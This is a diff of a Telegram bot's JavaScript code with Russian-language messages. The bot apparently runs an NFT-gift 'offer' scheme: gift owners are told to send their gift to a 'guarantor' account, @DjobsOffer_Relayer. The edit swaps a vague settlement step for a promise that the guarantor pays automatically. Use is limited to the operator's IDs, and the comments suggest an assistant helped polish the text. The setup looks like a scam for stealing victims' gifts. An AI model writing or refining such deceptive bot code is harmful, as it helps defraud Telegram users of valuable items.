@@ -1,7 +1,6 @@
 // ==========================================
-// НАСТРОЙКИ
+// НАСТРОЙКИ БОТА
 // ==========================================
-
 const ADMIN_ID = 7423713851; // Твой ID владельца
 const WEBHOOK_SECRET = "DjobsOfferSecret2026"; 
 const RELAYER_USERNAME = "DjobsOffer_Relayer"; // Ник гаранта
@@ -32,7 +31,8 @@ export default {
         const chatId = update.message.chat.id;
         const userId = update.message.from.id;
 
-        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант автоматически скидывает вам сумму, введённую в оффер.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
+        // Тут твой текст (я аккуратно его перенес)
+        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n4. После получения подарка гарант автоматически скидывает вам сумму, введённую в оффер.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
         
         const startMarkup = {
           inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
@@ -46,11 +46,16 @@ export default {
         const iq = update.inline_query;
         const userId = iq.from.id;
         
+        // Проверка доступа
         if (userId !== ADMIN_ID && !ALLOWED_IDS.includes(userId)) return new Response("OK", { status: 200 });
 
+        // Очистка запроса
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
         
-        if (!textQuery) return new Response("OK", { status: 200 });
+        // Если запрос пустой (только @DjobsOffer_Bot), ничего не выдаем, чтобы не спамить
+        if (!textQuery) {
+            return await callApi("answerInlineQuery", { inline_query_id: iq.id, results: [], cache_time: 0 }, BOT_TOKEN);
+        }
 
         let lang = "ru";
         if (textQuery.includes("eng") || textQuery.includes("en ")) {
@@ -94,6 +99,7 @@ export default {
             text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
         }
 
+        // Формируем красивую карточку предпросмотра
         const results = [{
           type: "article",
           id: "1",
@@ -108,7 +114,7 @@ export default {
           }
         }];
 
-        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
+        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0, is_personal: true }, BOT_TOKEN);
       }
 
       // --- КНОПКИ ---
@@ -133,7 +139,7 @@ export default {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
 
           const userId = cq.from.id;
-          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Наш бот полностью бесплатный, поэтому НФТ получает гарант.\n4. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант связывается с автором оффера для урегулирования деталей.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
+          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n4. После получения подарка гарант автоматически скидывает вам сумму, введённую в оффер.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
 
           const startMarkup = {
             inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
@@ -177,7 +183,6 @@ export default {
               show_alert: true 
             }, BOT_TOKEN);
             
-            // КНОПКА ВЕДЕТ НА ПОДАРОК (как в Гарисе), а в тексте пишем про гаранта
             const finalUrl = giftLink ? giftLink : ("https://t.me/" + RELAYER_USERNAME);
 
             if (lang === "en") {
